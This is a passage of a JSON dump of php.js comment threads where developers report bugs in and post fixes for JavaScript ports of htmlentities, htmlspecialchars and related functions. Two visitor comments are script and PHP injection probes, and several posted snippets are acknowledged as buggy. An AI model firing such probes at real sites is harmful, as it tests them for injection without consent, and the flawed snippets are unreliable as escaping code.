07:57:47","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@vikal: Does that mean you figured out the problem with the function? If you are still having trouble, please give a precise example where you see the problem. Thanks..."},{"date":"2009-08-27 07:17:11","author":"vikal","url":"braindigit.com","comment":"hi\n\nthough your function \n\nhtmlentities()\n\nis good\n\nbut \n\nnow we are having problem with this symbol \\\n\ndo you have any idea how to convert it to the html entities\n\nis there any solution so that i can change\n\n\\ to htmlentities\n\nhoping best here\n\nregards\n\nvikal\n\n\n"},{"date":"2009-08-30 04:44:56","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@vikal: 1) Why do you want to convert it to an entity?  If you are trying to filter user input on the client-side, doing it this way is not a safe way to do it, since people can get around it. You should use your database's own escape mechanisms instead (e.g., mysql_real_escape_string for MySQL).  2) If you do really want the entity form, you can use &#92; or &#x5c; , but there is no need to escape it in HTML or XML like this since a backslash is not reserved there."},{"date":"2010-06-07 16:48:44","author":"austin","url":"","comment":"Brett: i think its more for data coming FROM the server.\nin my case its an email client and i want to send them html that might be in an email, but i want to convert it to source by encoding all the tags but allow a function to put it out as actual html if the user agrees to it. since i cant know what email IS and ISNT safe for them to view, and since its a browser based email its even more dangerous as it runs in the context of that page. i would just strip ALL html, but some i need (such as the html reports made by svnnotify, they just dont look the same when you strip the tags)\n\nbut you are correct, this should NOT be used for client-side sanitization. nothing from a client should be considered secure."},{"date":"2010-11-08 21:05:13","author":"Gerry","url":"","comment":"Thanks. Great function."},{"date":"2010-11-15 13:32:28","author":"Satya Prakash","url":"http:\/\/www.satya-weblog.com","comment":"hi\nI feel this function has a bug. It cannot preserve single quote ('), when used ENT_NOQUOTES.\n\nSo, I need to use strtr() for that:\n\n[code]\nvar tmpVal = html_entity_decode (txtAreaVal);\n\ntxtArea.value = htmlentities(tmpVal, \"ENT_NOQUOTES\");\n\n\/\/ restore single quote\n$trans = {'&#039;' : \"'\" };\ntxtArea.value = strtr(txtArea.value, $trans);\n[\/code]"},{"date":"2010-11-27 12:50:51","author":"Jakub","url":"http:\/\/blog.petrykowski.net","comment":"Hi, very useful function, however, it seems to  be missing double_encode optional argument. htmlspecialchars has it. This argument is from PHP original functions.\n\nI had an issue with current version of the htmlentities function in Chrome dev browser (but not in FF or IE 8):\n\nwhen I run htmlentities('\"') it doesn't return $quot; but &amp;quot; which is broken obviously. htmlspecialchars() returns &quot; as expected. \n\nPHP htmlentities('\"') also returns &quot; \n\nIE or FF return what is expected. I don't know where the problem is, but it does look as if double encoding for amperand and quote takes place. I don't know why one browser interprets this code in a different way than others..."},{"date":"2011-01-25 04:53:18","author":"Aikar","url":"http:\/\/aikar.co","comment":"This code is extremely slow...\r\nI did a benchmark before and after adding this to my strings\r\n\r\nBEFORE:\r\n>>> node benchmark.js\r\nrendered 10000 times in 3192ms!\r\n\r\nAFTER:\r\n>>> node benchmark.js\r\nrendered 10000 times in 42797ms!\r\n\r\nUse with caution."},{"date":"2011-01-25 04:53:38","author":"Aikar","url":"http:\/\/aikar.co","comment":"This code is extremely slow...\r\nI did a benchmark before and after adding this to my strings\r\n\r\nBEFORE:\r\n>>> node benchmark.js\r\nrendered 10000 times in 3192ms!\r\n\r\nAFTER:\r\n>>> node benchmark.js\r\nrendered 10000 times in 42797ms!\r\n\r\nUse with caution."},{"date":"2011-01-25 05:17:08","author":"Aikar","url":"http:\/\/aikar.co","comment":"Follow up, changing tmp_str.split to tmp_str.replace(symbol, entity); sped it up by 22% (10s~)\r\n\r\nThen I furthur fixed the entire thing and did it properly, so can someone who knows how to update these functions implement this:\r\n\r\nhttps:\/\/gist.github.com\/794497\r\n\r\nGot my benchmark back down to where it was suppose to be with the above pasted versions:\r\n>>> node benchmark.js\r\nrendered 10000 times in 3200ms!"},{"date":"2011-01-25 05:31:18","author":"Aikar","url":"http:\/\/aikar.co","comment":"Grr I realize I messed up variable names when I was cutting out that code and it was essentially running nothing... But after fixing it it still got down to 9000ms which is an 80% performance gain, so it needs to be modified."},{"date":"2011-01-25 09:34:25","author":"Rafa? Kukawski","url":"http:\/\/blog.kukawski.pl","comment":"@Aikar: Are you absolutely sure your fix is correct? Simple changing from .split() to .replace() won't work correctly, unless you pass a regular expression with 'g' flag to .replace. When doing str.replace('foo', 'bar'), JavaScript replaces only first occurrence of 'foo' (http:\/\/jsfiddle.net\/8ydqr\/). Creating a new instance of RegExp object for every character (and escaping the character if required) would also take longer time to execute. But yes, this functions needs some optimizations."},{"date":"2011-05-01 09:30:30","author":"Shefik","url":"http:\/\/www.allknightaccess.com\/","comment":"Will the parameter \"double_encode\" be added in future release of this function?"},{"date":"2011-05-01 12:40:41","author":"Rafa? Kukawski","url":"","comment":"@Shefik: function with double_encode support landed on git"},{"date":"2011-06-29 18:21:30","author":null,"url":"empowertheweb.com","comment":"Minified\n[CODE]\nfunction htmlentities (s, qS, cS, dE)\n{\n    var h = {}, c = '', e = '', se=this;\n    s += '';\n\n    if (false === (h = se.get_html_translation_table('HTML_ENTITIES', qS)))\n    {\n        return false;\n    }\n    if (!!dE || dE == null)\n    {\n    \th[\"'\"] = '&#039;';\n        for (c in h) s = s.split(c).join(h[c]);\n    }\n    else\n    {\n        s = s.replace(\/([\\s\\S]*?)(&(?:#\\d+|#x[\\da-f]+|[a-z][\\da-z]*);|$)\/g, function (i,t,e) {\n            return se.htmlentities(t, qS, cS) + e;\n        });\n    }\n    return s;\n}\n[\/CODE]\n"},{"date":"2011-07-28 03:05:33","author":"Dj","url":"","comment":"Note that you have a bug.\nhash_map[\"'\"] = '&#039;'; should only be added when quote_style is ENT_QUOTES, otherwise the single quote will be allways converted independent of the quote style specified"},{"date":"2011-07-28 03:31:08","author":"Dj","url":"","comment":"Here one optimized version.\nUsing recursion calling self.htmlentities() will cause to load the table again and check source values, which does not make sense because you are using the same table.\nSo instead of recursion, use a simple loop working in the same scope.\n\n[CODE]\nfunction htmlentities (string, quote_style, charset, double_encode) {\n    string = string !== undefined ? string + '' : '';\n    var hash_map = this.get_html_translation_table('HTML_ENTITIES', quote_style),\n         char;\n\n    if (hash_map === false) {\n        return false;\n    }\n\n    if (quote_style && quote_style === 'ENT_QUOTES') {\n        hash_map[\"'\"] = '&#039;';\n    }\n    \n    if (!!double_encode || double_encode == null) {\n        for (char in hash_map) {\n            string = string.split(char).join(hash_map[char]);\n        }\n        return string;\n\n    } else {\n        return string.replace(\/([\\s\\S]*?)(&(?:#\\d+|#x[\\da-f]+|[a-z][\\da-z]*);|$)\/g, function (ignore, text, entity) {\n            for (char in hash_map) {\n               text = text.split(char).join(hash_map[char]);\n            }\n            return text + entity;\n        });\n    }\n}\n[\/CODE]"},{"date":"2011-07-29 21:12:38","author":"Dj","url":"","comment":"Note that the regex for double encode is not correct because it does not inglude html entities for uppercase characters, like &Ntilde;\n\nreplace [a-z][\\da-z] with [a-zA-Z][\\da-z]"},{"date":"2011-07-30 12:32:43","author":"Rafa? Kukawski","url":"","comment":"@Dj: thanks for your feedback. Changed the function according to your suggestions. You can see the changes on github."},{"date":"2011-09-17 10:47:57","author":"Komal","url":"","comment":"Hi,\r\nI am using ur code in one of my functionality but when I use \"extend\" word then its shwoing me some code as output instead of \"extend\"\r\ne.g., \r\n[CODE]\r\nvar str = htmlentities(\"test extend\",\"ENT_QUOTES\");\r\n[\/CODE]\r\n\r\n\/\/ Output in am getting is \r\ntest function(object) { return Object.extend.apply(this, [this, object]); }  \r\n\r\nIt means \"extend\" word is replaced by \"function(object) { return Object.extend.apply(this, [this, object]); }\"\r\n\r\nCan someone please check on this.\r\n\r\nThanks in Advanced.\r\n- Komal"},{"date":"2011-09-17 16:16:22","author":"Rafa? Kukawski","url":"","comment":"@Komal: try using new get_html_translation_table and htmlentities (depends on the first one) functions from git https:\/\/github.com\/kvz\/phpjs\/commit\/f9a42874e652d096245797c155f65a25a667b528"},{"date":"2011-09-20 09:32:24","author":"Komal","url":"","comment":"Thanks a lot @Rafa\u0142 \n\nI update the function htmlentities() from github and it works fine... :)"},{"date":"2011-12-20 02:50:18","author":"Eu","url":"","comment":"<script>alert('hi')<\/script>"},{"date":"2012-02-29 19:36:49","author":"Hans Henrik","url":"","comment":"this code isn't even close to complete. \nlike \n[CODE]\n\u00e6=&aelig;\n\u00f8=&oslash;\n\u00e5=&aring;\n\u00c6=&AElig;\n\u00d8=&Oslash;\n\u00c5=&Aring;\n[\/CODE]\nand there's lots of others missing 2 :p"},{"date":"2012-07-25 16:08:45","author":"Max von Buelow","url":"","comment":"The Code from line 29 to line 31 is already provided by get_html_translation_table:\n[CODE]\n    if (useQuoteStyle === 'ENT_QUOTES') {\n        entities['39'] = '&#39;';\n    }\n[\/CODE]"},{"date":"2012-08-06 18:54:10","author":"deepak","url":"www.gooogle.com","comment":"deepak sahu deepak sahu deepak sahu deepak sahu deepak sahu deepak sahu deepak sahu deepak sahu deepak sahu deepak sahu deepak sahu deepak sahu deepak sahu deepak sahu deepak sahu deepak sahu deepak sahu deepak sahu deepak sahu "}],"htmlspecialchars":[{"date":"2008-05-26 12:07:03","author":"Nathan","url":"","comment":"The source code doesn't work at all. There are two errors.\r\nTo fix it try this:\r\n\r\nvar reg=\/&amp;\/g\r\nstring=string.replace(reg, '&amp;amp;');"},{"date":"2008-05-31 12:34:30","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Nathan: Thanks for pointing this out, fixed."},{"date":"2008-07-01 16:23:34","author":"Arno","url":"","comment":"First of all thanks for this great work, does really help a lot.\r\n\r\nHowever this issue doesn't seem fixed yet.\r\n\r\nAs Nathan already pointed out, you have to remove the single quotes in your regexp. so that it reads\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nstring = string.replace(\/&lt;\/g, '&amp;lt;');\r\n[\/CODE]\r\n\r\nArno"},{"date":"2008-07-01 16:27:24","author":"Arno","url":"","comment":"I just see that your example here is wrong too. Here is the corrected version:\r\n\r\nThis is how you could call htmlspecialchars()\r\n[CODE=&quot;Javascript&quot;]\r\nhtmlspecialchars(&quot;&lt;a href='test'&gt;Test&lt;\/a&gt;&quot;, 'ENT_QUOTES');\r\n[\/CODE]\r\nAnd that would return\r\n[CODE=&quot;text&quot;]\r\n&amp;lt;a href=&amp;#039;test&amp;#039;&amp;gt;Test&amp;lt;\/a&amp;gt;\r\n[\/CODE]"},{"date":"2008-07-18 08:18:43","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Arno: Thank you for correcting me. It should be okay now."},{"date":"2008-10-15 01:46:26","author":"Philip Peterson","url":"","comment":"Here's an proposed implementation of get_html_translation_table.  I do have a small problem though, which probably has a simple solution, and I used the actual integer values for constants instead of ENT_QUOTES, etc. ...  would it not be more practical to do so, really, maybe have an optional &quot;CONSTANTS&quot; section in php.js?\r\n\r\nOh well, here's my code:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n\r\nHTML_SPECIALCHARS=0;\r\nHTML_ENTITIES=1;\r\nENT_COMPAT=2;\r\nENT_QUOTES=3;\r\n\r\nfunction get_html_translation_table(table, quote_style)\r\n{\r\nretarr=[];\r\nif(table==0)\r\n{\r\nif(quote_style == 2 || quote_style == 3)\r\n{\r\n  retarr=['&quot;':'&amp;quot', '\\'':'&amp;#39;', '&lt;':'&amp;lt;', '&gt;':'&amp;gt;', '&amp;':'&amp;amp;'];\r\n}\r\nif(quote_style == 2)\r\n{\r\n  \/\/ remove the ' entry\r\n}\r\n}\r\nelse if(table==1)\r\n{\r\n  \/\/ Do the same thing as table == 0, but with the huge list of characters found by calling get_html_translation_table(1)\r\n}\r\n}\r\n\r\n[\/CODE]"},{"date":"2008-10-20 18:41:48","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Philip Peterson: It's been decided some time ago that we do not want global dependencies (like constants). The method to implement these is to have the functions accept both the integer representation of the constants (leaving it compatible) and the constant as string (for usability). \r\nI've done some work on merging  get_html_translation_table, htmlentities &amp; htmlspecialchars and their counterparts, check it out if your like."},{"date":"2008-11-11 19:28:01","author":"atv","url":"http:\/\/thatsaninterestingpoint.org.ua","comment":"Today, 2008-11-11, this function encodes the string twice, so the output of such code\r\n[CODE=&quot;Javascript&quot;]\r\nhtmlspecialchars(&quot;&lt;a href='test'&gt;Test&lt;\/a&gt;&quot;, 'ENT_QUOTES')\r\n[\/CODE]\r\nwill be like this:\r\n[CODE=&quot;text&quot;]\r\n&amp;lt;a href='test'&amp;gt;Test&amp;lt;\/a&amp;gt;\r\n[\/CODE]\r\nFix this!"},{"date":"2008-11-13 23:20:15","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ atv: I'm not able to reproduce that behavior here. Also, if I run that test, my single quotes are being replaced by #039; entities.\r\n\r\nAre you sure you're running our latest version?"},{"date":"2009-01-07 11:24:05","author":"Ashley  Broadley","url":"http:\/\/blog.ls12style.co.uk","comment":"I really find the idea of the php.js fantastic! I for one am very impressed with everyones work!\r\n\r\nI have noticed a problem with the htmlentities (not sure if it applies to htmlspecialchars):\r\n\r\ntesting all the available symbols on my keyboard (\u00c2\u00a3, &lt;, &gt;, ', &quot; and such) i alert()'ed the supposedly encoded string and found that all ampersands were encoded, so &quot;&amp;pound;&quot; would be &quot;&amp;amp;pound;&quot; which then on a html page would echo &quot;&amp;pound;&quot; and not &quot;\u00c2\u00a3&quot; as it should.\r\n\r\nim not a pro so im not sure whats causing the the bug.\r\n\r\njust thought i would let you know!"},{"date":"2009-01-07 11:33:51","author":"Ashley  Broadley","url":"http:\/\/blog.ls12style.co.uk","comment":"OK, I seem to have fixed this problem.\r\nIt turned out that the &amp; symbol  was at the bottom of the ascii decimal array in 'get_html_translation_table'. I simply moved it to the top and now everything is fine.\r\n\r\nCan you test and confirm by emailing me?\r\n\r\nThanks\r\nAshley"},{"date":"2009-01-07 14:50:17","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Ashley Broadley: Thanks for noticing! \r\nI guess the &amp;amp; character must be the last character when decoding, but the first when encoding!"},{"date":"2009-01-14 18:39:15","author":"Guilherme Mello","url":"","comment":"If you try htmlspecialchars in PHP with this example, you're going to have a different conversion with javascript:\r\n\r\nuse the string : FS'IG'IKU&quot;UJHFE"},{"date":"2009-01-15 11:21:51","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Guilherme Mello: Could you please provide the output you get in php &amp; js?"},{"date":"2009-07-02 23:19:47","author":"T.Wild","url":"","comment":"A Frank Forte posted over on strtr (http:\/\/phpjs.org\/functions\/strtr:556#comment_75192) that htmlspecialcharacters is encoding ampersands after encoding other characters.\nso < test > becomes andamp;lt test andamp;gt\nI've confirmed this myself, and his fix of moving the line\n[code]entities['38'] = '&amp;';[\/code]\nto the top of the entities list (before the line\n[code]if (useTable === 'HTML_ENTITIES')[\/code]\nseems to work without effecting the other dependent functions:\nhtmlentities\nhtml_entity_decode\nhtmlspecialchars_decode"},{"date":"2009-07-02 23:23:02","author":"T.Wild","url":"","comment":"Sorry, just to be clear that's moving the line over at\nget_html_translation_table"},{"date":"2009-07-03 14:01:23","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ T.Wild: Hey man. Thanks a lot for testing this. I've patched it in SVN, and things will be online shortly"},{"date":"2009-12-05 20:46:30","author":"felix","url":"","comment":"Hi,\n\nseems that the script has problems with ie6 + 7 .. here the browser says \"object expected\" in line 41\/42... ???\n\nalso.. does this function work with utf-8 ?"},{"date":"2009-12-06 15:22:04","author":"felix","url":"","comment":"problem solved.. wrong synthax in in row 38\/39.. after \"'ENT_IGNORE' : 4\" there's  a comma but it shouldnt be there ^^"},{"date":"2009-12-07 10:33:54","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Felix: Thanks for the feedback. Yes, I pushed earlier to the git repo with the fix. Was my oversight as I was testing in Firefox which doesn't have a problem with trailing commas.  htmlspecialchars_decode() also had the issue which I fixed as well. Thanks again!"},{"date":"2010-02-11 08:50:55","author":"hacksmw","url":"","comment":"htmlspecialchars_decode function in PHP doesn't work recursive.\nbut this function is too recursive.\nso \"&amp; #9787;\" will not be converted by this function as \"& #9787;\"\nhowever, it will be converted as \"\u263b\"\non the other hand, \nthe function in php will convert it as \"&# 9787;\"\n\n(\ni can't delete my old comment.\nso, i wrote this comment once again :(\n)"},{"date":"2010-02-11 08:53:42","author":"hacksmw","url":"","comment":"htmlspecialchars_decode function in PHP doesn't work recursive.\r\nbut this function is too recursive.\r\nso \"& amp; #9787;\" will not be converted by this function as \"& #9787;\"\r\nhowever, it will be converted as \"\u263b\"\r\non the other hand, \r\nthe function in php will convert it as \"&# 9787;\"\r\n\r\n(\r\ni can't delete my old comment.\r\nso, i wrote this comment once again :(\r\n)"},{"date":"2010-02-12 18:43:39","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@hacksmw: When I try [CODE]alert(htmlspecialchars_decode('& amp;#9787;'))[\/CODE]\n\n...I do get & #9787; in our php.js JavaScript.\n\nMake sure you are using the latest code (see http:\/\/github.com\/kvz\/phpjs\/raw\/master\/functions\/strings\/htmlspecialchars_decode.js )."},{"date":"2010-05-21 14:49:29","author":"test","url":"","comment":"<?php echo 'hello admin!'; ?>"},{"date":"2011-04-18 13:27:32","author":"s","url":"","comment":"SSSSSS"},{"date":"2012-06-28 03:12:24","author":"randy","url":"http:\/\/ic4ever.com","comment":"Very nice function. It worked great for me. I came here 1st!\nBut then I also found this method ..\n[CODE]\nvar a = 'one <p> tag';\n$('<div\/>').text(a); \/\/ [<div>\u200bone <p> tag\u200b<\/div>\u200b]\n$('<div\/>').text(a).html(); \/\/ \"one &lt;p&gt; tag\"\n[\/CODE]\nThe $(element) creates an html element, .text(a) sets the element content to the text (read \"escaped\") value of \"a\", the .hmtl() gets the html value of the contents of the element. As in .innerHTML.\n\nVery nice also for you if you use jQuery."}],"htmlspecialchars_decode":[{"date":"2008-05-31 10:49:39","author":"loonquawl","url":"","comment":"Shouldn't it be\r\n[CODE=&quot;Javascript&quot;]\r\n   string = string.replace(\/&amp;\/g, '&amp;');\r\n   string = string.replace(\/&lt;\/g, '&lt;');\r\n   string = string.replace(\/&gt;\/g, '&gt;');\r\n[\/CODE]\r\n\r\nrather than\r\n\r\n[CODE = &quot;Javascript&quot;]\r\n    string.replace('\/&amp;\/g', '&amp;');\r\n    string.replace('\/&lt;\/g', '&lt;');\r\n    string.replace(\/&gt;\/g, '&gt;')\r\n[\/CODE]\r\n?\r\n\r\nFunction (string object).replace() doesn't modify the string. It returns a new (replaced) string object."},{"date":"2008-05-31 14:31:41","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ loonquawl: Guess it should ;) thank you!"},{"date":"2008-05-31 23:05:17","author":"Mateusz &quot;loonquawl&quot; Zalega (http:\/\/loonquawl.yoyo.","url":"","comment":"No problem :)\r\n\r\nThere's another bug in this function. First argument of called function string.replace() is a string object '\/&amp;amp;\/g'. It won't work, unless it's a regular expression object (should be \/&amp;amp;\/g - without the apostrophes).\r\nHere's the correct code:\r\n[CODE=&quot;Javascript&quot;]\r\n    string = string.toString();\r\n    \r\n    \/\/ Always encode\r\n    string = string.replace(\/&amp;amp;\/g, '&amp;');\r\n    string = string.replace(\/&amp;lt;\/g, '&lt;');\r\n    string = string.replace(\/&amp;gt;\/g, '&gt;');\r\n    \r\n    \/\/ Encode depending on quote_style\r\n    if (quote_style == 'ENT_QUOTES') {\r\n        string = string.replace(\/&amp;quot;\/g, '&quot;');\r\n        string = string.replace(\/&amp;#039;\/g, '\\'');\r\n    } else if (quote_style != 'ENT_NOQUOTES') {\r\n        \/\/ All other cases (ENT_COMPAT, default, but not ENT_NOQUOTES)\r\n        string = string.replace(\/&amp;quot;\/g, '&quot;');\r\n    }\r\n    \r\n    return string;\r\n[\/CODE]\r\n\r\nThis is explained here:\r\nhttp:\/\/developer.mozilla.org\/en\/docs\/Core_JavaScript_1.5_Reference:Global_Objects:String:replace\r\nhttp:\/\/developer.mozilla.org\/en\/docs\/Core_JavaScript_1.5_Reference:Objects:RegExp\r\n\r\nBtw. Most people involved in php2js project have their full names in credits. So, my name's Mateusz Zalega. Just saying :)"},{"date":"2008-07-27 01:50:45","author":"Bob Palin","url":"","comment":"The function description says that 'quote_style' is an int and list constants, in fact the argument is a string as shown in the code and example."},{"date":"2008-07-27 13:50:57","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Bob Palin: Thank you for noticing. It is possible to declare global constants in javascript, but that would increase the number of dependencies throughout this project.\r\n\r\nWe have deliberately chosen to implement this a bit different from the original PHP documentation to allow for more functions to be included separately."},{"date":"2008-09-17 19:55:32","author":"Trevor","url":"","comment":"Issue: Doesn't decode all html escaped characters, such as &amp;#56;"},{"date":"2008-09-21 21:40:22","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"[CODE=&quot;php&quot;]\r\n&lt;?php\r\necho html_entity_decode(&quot;&amp;#56;&quot;).&quot;\\n&quot;;\r\n?&gt;\r\n[\/CODE]\r\nreturns 8. \r\n\r\nThis behavior is not documented in the PHP manual though, do you know what table is used here?"},{"date":"2008-09-25 06:57:11","author":"ReverseSyntax","url":"","comment":"There is an error in the htmlspecialchars_decode(),\r\nThere a single quote around the regex for all params values in replace() except for &gt; the only one that works. this is in the php.min.js"},{"date":"2008-09-25 14:10:12","author":"Onno Marsman","url":"","comment":"There is a serious parse error in this function\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nstring = string.replace(\/&amp;gt;\/g '&gt;');\r\n[\/CODE]\r\n\r\nshould be (added a comma):\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nstring = string.replace(\/&amp;gt;\/g, '&gt;');\r\n[\/CODE]"},{"date":"2008-09-29 12:31:25","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ ReverseSyntax &amp;  Onno Marsman: Wow that was ugly. Sorry everyone. Fixed."},{"date":"2009-08-10 01:22:57","author":"Liviu Mirea","url":"","comment":"[CODE]\nhtmlspecialchars_decode(' &amp;quot; '); \n[\/CODE]\nIn PHP it returns: &quot;\n\nThe Javascript function above returns: \"\nBasically, it first decodes \"&amp;\" to \"&\", thus resulting \"&quot;\". Afterward, it decodes \"&quot;\" but it shouldn't."},{"date":"2009-08-10 01:26:14","author":"Liviu Mirea","url":"","comment":"Erm, ignore my message below, the caracters are messed up.\nHere:\n[CODE]\nhtmlspecialchars_decode(' &amp;quot; '); \n[\/CODE]\nIn PHP it returns: \n[CODE]\n&quot;\n[\/CODE]\n\nThe Javascript function above returns: \"\nBasically, it first decodes [CODE]\"&amp;\"[\/CODE] to [CODE]\"&\"[\/CODE], thus resulting [CODE]\"&quot;\"[\/CODE]. It further decodes the string to a double quotation mark when it shouldn't."},{"date":"2009-08-10 01:31:30","author":"Liviu Mirea","url":"","comment":"I'm sorry but the messaging system seems to be messed up and I can't post my message. What I'm trying to say is that the above function is incorrect. If you try to decode \"& amp; quot;\" (remove spaces) it will output a double quotation mark instead of \"& quot;\" (remove spaces). Hope this message will be properly posted. :\/"},{"date":"2009-08-16 15:38:06","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Liviu Mirea: I added your example as a testcase, but I was unable to reproduce the problem. \n\nWhat version & browser are you using?"},{"date":"2009-11-25 01:05:38","author":"Mailfaker","url":"http:\/\/www.weedem.fr","comment":"Hi everyone,\nthis code wasn't working for me. I have done some changes and now it runs.\nThe problem is that, for decoding, hash_map table must be read in descending order. Or simply, you can do so:\n[CODE]\nfunction htmlspecialchars_decode (string) {\n    tmp_str = string.toString();\n    tmp_str = tmp_str.split('&quot;').join('\"');\n    tmp_str = tmp_str.split('&lt;').join('<');\n    tmp_str = tmp_str.split('&gt;').join('>');\n    tmp_str = tmp_str.split('&amp;').join('&');\n    return tmp_str;\n}\n[\/CODE]"},{"date":"2009-11-25 12:47:32","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Mailfaker: Thanks. I've completely redone the two htmlspecialchars functions in Git, also to handle flags and arguments: http:\/\/github.com\/kvz\/phpjs\/commit\/881de8748cf986d025ecfad5f448fbbb8ba7710e  . Btw, using replace was much faster for me (and easier) than using split and join."},{"date":"2010-02-11 08:47:27","author":"hacksmw","url":"","comment":"htmlspecialchars_decode function in PHP doesn't work recursive.\nbut this function is too recursive.\nso \"&amp;#9787;\" will not be converted by this function as \"&#9787;\"\nhowever, it will be converted as \"\u263b\"\non the other hand, \nthe function in php will convert it as \"&#9787;\""},{"date":"2010-02-13 04:39:10","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"See my comment under htmlspecialchars()"},{"date":"2010-04-27 07:20:39","author":"Jerry","url":"","comment":"Here is my simple implementation of htmlspecialchars_decode.\nI use just one replace and I have not come across a situation where an html entity is double-decoded. Comments are welcome\n[CODE]\nfunction(a,b){\nvar c={\n     '&amp;':'&',\n     '&lt;':'<',\n     '&gt;':'>',\n     '&quot;':'\"',\n     '&#039;':'\\''\n};\n     if(b==='ENT_QUOTES'){\n     return a.replace(\/&amp;|&lt;|&gt;|&quot;|&#039;\/g,function(a){return c[a];});\n     }\n     else if(b==='ENT_NOQUOTES'){\n     return a.replace(\/&amp;|&lt;|&gt;\/g,function(a){return c[a];});\n     }\n     else{\n     return a.replace(\/&amp;|&lt;|&gt;|&quot;\/g,function(a){return c[a];});\n     }\n}\n[\/CODE]"},{"date":"2010-04-27 17:19:59","author":"Rafa? Kukawski","url":"http:\/\/blog.kukawski.pl","comment":"@Jerry: very short and clean solution. I just managed to replace the 3 .replace calls with just one, by choosing the regexp with a conditional expression.\n[CODE]function htmlspecialchars_decode(input, quote_style){\n   var c = {\n      '&amp;': '&',\n      '&lt;': '<',\n      '&gt;': '>',\n      '&quot;': '\"',\n      '&#039;': '\\''\n   };\n   return ('' + input).replace(quote_style === 'ENT_QUOTES' ? \/&amp;|&lt;|&gt;|&quot;|&#039;\/g : quote_style === 'ENT_NOQUOTES' ? \/&amp;|&lt;|&gt;\/g : \/&amp;|&lt;|&gt;|&quot;\/, function(a){return c[a]; });\n}[\/CODE]\n\nThe performance of both solutions should be comparable.\nAnd I added casting of the input to string."},{"date":"2010-04-27 17:27:48","author":"Rafa? Kukawski","url":"http:\/\/blog.kukawski.pl","comment":"Sorry for the double comment, but now the code should be more readable\n\n[CODE]function htmlspecialchars_decode(input, quote_style) {\n\tvar c = {\n\t\t'&amp;': '&',\n\t\t'&lt;': '<',\n\t\t'&gt;': '>',\n\t\t'&quot;': '\"',\n\t\t'&#039;': '\\''\n\t};\n\treturn ('' + input).replace(\n\t\tquote_style === 'ENT_QUOTES' ? \/&amp;|&lt;|&gt;|&quot;|&#039;\/g :\n\t\tquote_style === 'ENT_NOQUOTES' ? \/&amp;|&lt;|&gt;\/g :\n\t\t\/&amp;|&lt;|&gt;|&quot;\/,\n\t\tfunction (a) {\n\t\t\treturn c[a];\n\t\t}\n\t);\n}[\/CODE]"},{"date":"2010-04-27 19:07:58","author":"Jerry","url":"","comment":"Very nice - I think I will use your modification as its much tidier.\nDon't forget the 'g' attribute on the last pattern."},{"date":"2010-07-10 11:23:14","author":"Robert Sidlauskas","url":"http:\/\/filesharepoint.com","comment":"Hi its good.\n\n<a href='http:\/\/filesharepoit.com'>Filesharepoint.com<\/a> "}],"http_build_query":[{"date":"2008-03-02 06:03:30","author":"marrtins","url":"","comment":"Hello!\r\n\r\nI got syntax errors on IE6:\r\nconst CASE_LOWER = 0;\r\nconst CASE_UPPER = 1;\r\n\r\nraplacing with\r\nvar CASE_LOWER = 0;\r\nvar CASE_UPPER = 1;\r\n\r\nworks fine"},{"date":"2008-03-02 07:20:24","author":"Legaev Andrey","url":"","comment":"Hi!\r\n\r\nKey can contain no-ascii character too, and encodeURIComponent() is more appropriate function.\r\n\r\nPlease, replace code\r\n[CODE=&quot;Javascript&quot;]\r\nuse_key = key;\r\nuse_val = encodeURI(formdata[key].toString());\r\nuse_val = use_val.replace('%20', '+');\r\n[\/CODE]\r\nby following:\r\n[CODE=&quot;Javascript&quot;]\r\nuse_key = encodeURIComponent(key);\r\nuse_val = encodeURIComponent(formdata[key].toString());\r\n[\/CODE]\r\nKey can contain no-ascii character too, and encodeURIComponent() is more appropriate function."},{"date":"2008-03-02 12:15:50","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"Legaev Andrey: Thank you, still needed the\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nuse_val = use_val.replace('%20', '+');\r\n[\/CODE]\r\n\r\nthough, apparently encodeURIComponent does not produce php compatible encoded ouput"},{"date":"2008-03-02 12:22:44","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ marrtins: Thanks for contributing!"},{"date":"2008-03-02 18:31:28","author":"Michael White","url":"","comment":"Ah - I ran into that problem where the output of encodeURI was incompatible with PHP as well about two months ago.\r\n\r\nYou have to use escape() instead. PHP likes this one. I've used it for a while in my own Ajax requests."},{"date":"2008-03-02 18:37:21","author":"Michael White","url":"","comment":"Ooops - forgot the code block....\r\n\r\n\r\nReplace....\r\n[CODE=&quot;Javascript&quot;]\r\nuse_key = encodeURIComponent(key);\r\nuse_val = encodeURIComponent(formdata[key].toString());\r\nuse_val = use_val.replace('%20', '+');\r\n[\/CODE]\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nuse_key = escape(key);\r\nuse_val = escape(formdata[key].toString());\r\n[\/CODE]"},{"date":"2008-03-02 19:29:30","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Michael White: Done"},{"date":"2008-03-02 